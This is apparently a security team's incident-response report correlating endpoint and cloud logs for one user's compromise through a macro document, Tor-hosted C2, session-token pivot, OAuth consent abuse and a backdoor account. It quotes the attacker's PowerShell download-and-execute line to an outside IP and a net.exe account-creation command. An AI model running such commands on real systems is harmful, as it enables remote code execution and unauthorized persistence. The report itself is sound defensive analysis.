---
subject: mrodriguez / WKSTN-017 — hybrid-identity compromise
date_range: 2026-07-09 to 2026-07-11
date_correlated: 2026-07-24
sources:
  - analysis/endpoint.md (Windows Security + Sysmon)
  - analysis/cloud.md (Azure AD sign-in + audit)
correlation_anchors: [mrodriguez, 185.220.101.47]
---

# Correlated Investigation — mrodriguez Compromise (2026-07-10)

Both source analyses independently flagged the **same identity** (`mrodriguez`)
and the **same external IP** (`185.220.101.47`) without shared context. Merging
them converts two individually-suspicious pictures into one confirmed,
cross-domain intrusion.

## 1. Timeline Alignment (unified, UTC)

| Time | Domain | Event | Source |
|---|---|---|---|
| 09:06:57 | Endpoint | Chrome launched on WKSTN-017 by mrodriguez (probable doc-delivery vector) | endpoint |
| 09:07:52 | Endpoint | `WINWORD.EXE` opens `Invoice_7742.docm` → hidden base64 PowerShell (Sysmon tags `T1059.001`) | endpoint |
| **09:08:05** | **Endpoint** | **PowerShell → outbound C2 to `185.220.101.47:443`** | endpoint |
| **11:00:14** | **Cloud** | **Sign-in from `185.220.101.47` (Bucharest), high risk, no device, CA success** | cloud |
| 11:26:37 | Cloud | Concurrent sign-in from Austin/WKSTN-017 (the *real* user, still working) | cloud |
| 11:35:22 | Cloud | New MFA method (Microsoft Authenticator) registered from `185.220.101.47` | cloud |
| 11:50:47 | Cloud | OAuth consent to "Data Sync Helper" (`Mail.Read/ReadWrite`, `Directory.Read.All`, `offline_access`) from `185.220.101.47` | cloud |
| 16:04:51 | Endpoint | 4624 Type-3 logon to FS01 from 10.10.17.55 (WKSTN-017's IP) | endpoint |
| 16:06:14 | Endpoint | `net.exe user helpdesk2 P@ssw0rd2026! /add` on FS01 | endpoint |
| 16:06:55 | Endpoint | 4720 — local/domain account `helpdesk2` created on FS01 | endpoint |

**Key alignment insight:** the endpoint analyst noted a "~7-hour gap with no
additional endpoint signal" between the C2 callback (09:08) and the FS01
lateral movement (16:04). The cloud activity (11:00–11:51) falls **exactly
inside that gap** — the attacker wasn't idle; they had pivoted to the cloud.
Neither analysis could see this on its own.

## 2. User Correlation

Only **one** user appears anomalously in both sources: `CORP\mrodriguez`
(endpoint) = `mrodriguez@corp.com` (cloud). The other ~19 users are clean
baseline in both.

- **On endpoint:** executed the malicious doc, made the C2 callback, then
  logged into FS01 and created the `helpdesk2` backdoor.
- **In cloud:** the account was signed into from attacker infrastructure,
  had a new MFA method registered, and granted OAuth mail-access consent.

Identity normalization worked as designed: the on-prem NetBIOS form
(`CORP\mrodriguez`) and the cloud UPN (`mrodriguez@corp.com`) resolve to the
same person once the `DOMAIN\` / `@corp.com` affixes are stripped.

## 3. IP Correlation

| IP | Endpoint role | Cloud role | Verdict |
|---|---|---|---|
| **`185.220.101.47`** | C2 destination (09:08) | Sign-in + persistence source (11:00–11:51) | **Shared across both domains — the linchpin IOC. Tor exit range.** |
| `10.10.17.55` | WKSTN-017's own IP; source of the FS01 logon | — | Internal lateral-movement pivot; endpoint-only |
| `203.0.113.10/.11/.12` | — | Legitimate corp egress (Austin) | Baseline; cloud-only |

The external IP appearing as **both** the endpoint C2 target **and** the cloud
sign-in origin is the single strongest correlation in the case — it is what
proves the endpoint infection and the cloud account takeover are the same
operation, not two coincidental events.

## 4. Attack Chain

- **Initial access (T1566 / T1204.002):** `Invoice_7742.docm` opened from
  Downloads on WKSTN-017, ~1 min after Chrome launched. Delivery channel
  (email vs. web download) is **not confirmed** — no mail/proxy logs.
- **Endpoint execution & C2 (T1059.001 / T1027 / T1105 / T1071.001):** macro
  spawns hidden encoded PowerShell → `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/update.ps1')`
  → outbound to `185.220.101.47:443`. The second-stage `update.ps1` was not
  captured, but its almost-certain purpose is session-token/cookie theft (see
  pivot).
- **Pivot endpoint → cloud (T1550.001 / T1539 / T1078.004):** ~2 hours later
  the attacker authenticates to Exchange Online **from the same C2 IP**, with
  no MFA challenge despite high risk — the signature of a replayed session
  token rather than a password login. **This directly resolves the cloud
  analyst's open question:** they hypothesized a possible "cloud-only session
  hijack" and asked whether WKSTN-017 ever contacted the Tor IP. It did (09:08)
  — so this was *not* cloud-only; the endpoint was compromised first and is
  the most likely token-theft point.
- **Cloud persistence (T1098.005 / T1550.001 illicit consent):** MFA method
  registration + OAuth consent to "Data Sync Helper" with `offline_access`
  give the attacker durable access that survives a password reset or the
  user's session expiring.
- **Return to on-prem — lateral movement & backdoor (T1078 / T1136):** at
  16:04 a Type-3 logon from WKSTN-017's IP reaches FS01, where `helpdesk2` is
  created as a standing backdoor account.
- **Ultimate objective:** the mail-scoped OAuth grant (`Mail.Read`,
  `Mail.ReadWrite`) plus `offline_access` points to **email collection /
  espionage** as the primary goal, with the `helpdesk2` account as secondary
  on-prem persistence / expansion. Thematically this mirrors the
  email-collection + MFA-manipulation + OAuth-abuse TTPs catalogued in
  `analysis/ti-2026-07-23-laundry-bear-zimbra-zcs.md`.

## 5. Confidence Assessment

**High confidence:**
- `mrodriguez` is compromised and `185.220.101.47` is attacker infrastructure
  operating in both the endpoint and cloud domains.
- The endpoint infection (09:08 C2) and the cloud takeover (11:00+) are one
  operation — the shared IP within a ~2-hour window is decisive.
- The cloud persistence actions (MFA registration, OAuth consent) occurred and
  are attacker-controlled.
- The `11:26` "impossible travel" is better read as **concurrent sessions**:
  the real user kept working from Austin/WKSTN-017 while the attacker operated
  from the Tor IP — i.e., the user was likely unaware, not physically traveling.

**Medium / uncertain:**
- **Token-theft mechanism** — `update.ps1` (the second stage) was never
  captured, so "session-cookie theft" is inferred from the pivot pattern, not
  directly observed.
- **Mail exfiltration** — the "Data Sync Helper" consent is confirmed, but no
  Graph/mailbox-access activity for that app appears in the 3-day window, so
  downstream email theft is not yet evidenced.
- **FS01 logon attribution** — the endpoint analyst flagged that `mrodriguez`
  has baseline `services.exe` admin logons to several hosts, so the 16:04 FS01
  logon *pattern* isn't unique; it's the `helpdesk2` creation that confirms it
  malicious, not the logon itself.
- **helpdesk2 scope** — local FS01 account vs. domain account is unresolved
  (4720 fired on FS01, but the SID carries the domain prefix).

**Low / no evidence:**
- No other user, no other IP, and no privilege-role assignments are implicated.

## 6. Gaps — Missing Logs That Would Help

1. **Second-stage payload** — contents of `update.ps1`; would confirm the
   token-theft hypothesis.
2. **Mail gateway / email logs** — how `Invoice_7742.docm` was delivered.
3. **M365 unified audit / Graph `MailItemsAccessed`** — whether "Data Sync
   Helper" actually read/exfiltrated mail after 11:50.
4. **Proxy / firewall / DNS** — confirm WKSTN-017 was the only host contacting
   `185.220.101.47`; resolve the payload-URL port-80 vs. observed-443 mismatch.
5. **FS01 / DC1 Sysmon** — no process-tree visibility on the pivot target;
   only 4688/4720 are available there.
6. **Browser token-cache / cookie-access events on WKSTN-017** (09:08–11:00) —
   would pin down the exact token-theft moment.
7. **Logs beyond 2026-07-11** — whether `helpdesk2` was ever used and whether
   the OAuth app began pulling mail.

## Recommended Containment

- Disable `mrodriguez` and **revoke refresh tokens / sign in sessions**
  (a password reset alone is insufficient given the OAuth `offline_access`
  grant and attacker-registered MFA).
- **Remove the "Data Sync Helper" OAuth consent / service principal** and the
  attacker-added MFA method.
- **Delete the `helpdesk2` account** on FS01 and audit for any use.
- Reset `mrodriguez`'s on-prem **and** cloud credentials.
- Isolate WKSTN-017 (and FS01) for forensic capture of `update.ps1` and the
  process gap between 09:08 and 16:04.
- Block `185.220.101.47` / monitor for the broader Tor-exit range.
